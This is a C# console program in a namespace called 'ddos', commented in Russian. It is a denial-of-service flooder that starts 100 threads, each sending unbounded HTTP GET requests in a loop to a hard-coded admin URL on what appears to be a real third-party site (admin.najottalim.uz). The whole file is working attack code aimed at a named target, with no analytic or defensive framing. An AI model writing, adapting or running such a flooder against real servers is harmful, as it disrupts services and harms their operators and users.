using System;
using System.Net.Http;
using System.Threading.Tasks;
using System.Threading;
namespace ddos
{
    internal class Program
    {
        static async Task SendRequest()
        {
            try
            {
                // Замените "TARGET_URL" на URL целевого сервера
                string url = "https://admin.najottalim.uz/my-groups";
                HttpClient client = new HttpClient();
                HttpResponseMessage response = await client.GetAsync(url);
                Console.WriteLine("Request sent!");
            }
            catch (Exception e)
            {
                Console.WriteLine("Error: " + e.Message);
            }
        }

        // Количество потоков для параллельной отправки запросов
        const int NUM_THREADS = 100;

        static void Main(string[] args)
        {
            // Создание и запуск потоков
            Thread[] threads = new Thread[NUM_THREADS];
            for (int i = 0; i < NUM_THREADS; i++)
            {
                Thread thread = new Thread(() => {
                    while (true)
                    {
                        SendRequest().Wait();
                    }
                });
                thread.Start();
                threads[i] = thread;
            }

            // Ожидание завершения всех потоков
            foreach (Thread thread in threads)
            {
                thread.Join();
            }
        }
    }
}
